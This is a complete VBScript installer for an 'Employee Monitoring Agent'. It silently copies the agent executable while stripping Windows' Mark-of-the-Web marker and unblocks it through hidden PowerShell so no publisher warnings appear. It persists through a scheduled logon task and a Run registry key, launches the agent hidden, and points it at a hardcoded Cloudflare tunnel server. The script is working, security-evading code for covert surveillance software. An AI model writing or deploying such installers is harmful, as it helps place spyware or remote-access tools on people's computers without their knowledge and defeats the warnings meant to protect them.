' Employee Monitoring Agent — 100% Silent Installer
' Strips Zone.Identifier (Mark-of-the-Web) so Windows NEVER prompts "Publisher could not be verified" on reboot.

Dim fso, shell, appData, installDir, serverUrl, scriptDir

Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

scriptDir = fso.GetParentFolderName(WScript.ScriptFullName)
appData = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%")
installDir = appData & "\Amvion\EmployeeMonitoringAgent"

' 1. Read server_url.txt
serverUrl = "https://edmonton-assumption-logging-twelve.trycloudflare.com"
If fso.FileExists(scriptDir & "\server_url.txt") Then
    Dim urlFile
    Set urlFile = fso.OpenTextFile(scriptDir & "\server_url.txt", 1)
    If Not urlFile.AtEndOfStream Then
        serverUrl = Trim(urlFile.ReadLine)
    End If
    urlFile.Close
End If

' 2. Terminate any running instance
On Error Resume Next
shell.Run "taskkill /F /IM EmployeeMonitoringAgent.exe", 0, True
On Error GoTo 0

' 3. Create install folder if needed
If Not fso.FolderExists(appData & "\Amvion") Then
    fso.CreateFolder(appData & "\Amvion")
End If
If Not fso.FolderExists(installDir) Then
    fso.CreateFolder(installDir)
End If

' 4. Clean old state, stream-copy executable (stripping Zone.Identifier ADS) and save server_url
If fso.FileExists(installDir & "\agent_state.json") Then
    fso.DeleteFile installDir & "\agent_state.json", True
End If

shell.Run "cmd.exe /c type """ & scriptDir & "\EmployeeMonitoringAgent.exe"" > """ & installDir & "\EmployeeMonitoringAgent.exe""", 0, True
shell.Run "powershell.exe -NoProfile -WindowStyle Hidden -Command ""Unblock-File -Path '" & installDir & "\*' -ErrorAction SilentlyContinue""", 0, True

Dim outFile
Set outFile = fso.CreateTextFile(installDir & "\server_url.txt", True)
outFile.WriteLine serverUrl
outFile.Close

' 5. Register silent boot startup via Task Scheduler + HKCU Run (zero security prompts on reboot)
shell.Run "schtasks /Create /SC ONLOGON /TN ""AmvionMonitoringAgent"" /TR ""\""" & installDir & "\EmployeeMonitoringAgent.exe\"""" /RL LIMITED /F", 0, True
shell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\EmployeeMonitoringAgent", """" & installDir & "\EmployeeMonitoringAgent.exe""", "REG_SZ"

' 6. Launch agent immediately in background (window style 0 = hidden)
shell.Run """" & installDir & "\EmployeeMonitoringAgent.exe""", 0, False

' 7. Clean notification
MsgBox "Employee Monitoring Agent has been installed and unblocked." & vbCrLf & vbCrLf & "It will start silently in the background on every reboot without asking for confirmation.", 64, "Amvion Employee Monitoring"
